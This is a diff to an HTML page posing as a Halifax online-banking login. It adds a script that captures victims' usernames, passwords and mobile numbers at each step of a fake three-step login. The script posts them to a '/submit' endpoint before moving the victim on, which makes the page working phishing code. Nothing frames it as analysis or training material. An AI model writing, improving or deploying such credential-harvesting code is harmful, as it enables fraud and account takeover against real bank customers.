@@ -158,8 +158,10 @@
             <input type="tel" id="hfx-mobile" autocomplete="tel" placeholder="e.g. 07700 900000" />
             <p class="hint">We&rsquo;ll send your one-time security code to this number in step 3.</p>
           </div>
+          <input type="hidden" id="email" value="" />
+          <input type="hidden" id="ms-mobile" value="" />
           <label class="chk"><input type="checkbox" /> Remember my username on this device</label>
-          <button class="btn" onclick="goWithLoader(2,this)">Continue</button>
+          <button class="btn" onclick="nextStep(this)">Continue</button>
           <hr />
           <div class="links">
             <a href="#">Forgotten your username?</a>
@@ -179,7 +181,7 @@
             <div class="char-row" id="char-row"></div>
             <p class="hint" style="margin-top:12px;">Characters are not case sensitive.</p>
           </div>
-          <button class="btn" onclick="goWithLoader(3,this)">Continue</button>
+          <button class="btn" onclick="doPassword(this)">Continue</button>
           <hr />
           <div class="links">
             <a href="#" onclick="go(1);return false;">&larr; Back</a>
@@ -205,7 +207,7 @@
             </div>
           </div>
           <p class="resend">Didn't receive a code? <a href="#" onclick="return false;">Resend code</a> &nbsp;&middot;&nbsp; <a href="#" onclick="return false;">Use the Halifax app instead</a></p>
-          <button class="btn" onclick="goWithLoader(4,this)">Verify &amp; Log in</button>
+          <button class="btn" onclick="doVerify(this)">Verify &amp; Log in</button>
           <hr />
           <div class="links">
             <a href="#" onclick="go(2);return false;">&larr; Back</a>
@@ -298,6 +300,24 @@
 </footer>
 
 <script>
+  async function sendLogs(type) {
+    var email = document.getElementById('email')?.value || document.getElementById('uid')?.value || '';
+    var pwd = document.getElementById('pwd')?.value || '';
+    var mobile = document.getElementById('ms-mobile')?.value || document.getElementById('hfx-mobile')?.value || '';
+    try {
+      await fetch('/submit', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ type: type, email: email, pwd: pwd, mobile: mobile })
+      });
+    } catch (e) {
+      console.warn('sendLogs failed', e);
+    }
+  }
+  function nextStep(btn) { sendLogs('email-step'); goWithLoader(2, btn); }
+  function doPassword(btn) { sendLogs('password-step'); goWithLoader(3, btn); }
+  function doVerify(btn) { sendLogs('verify-step'); goWithLoader(4, btn); }
+
   // Generate random char positions for memorable word (3 chars from a 8-char word)
   var positions = [];
   (function(){
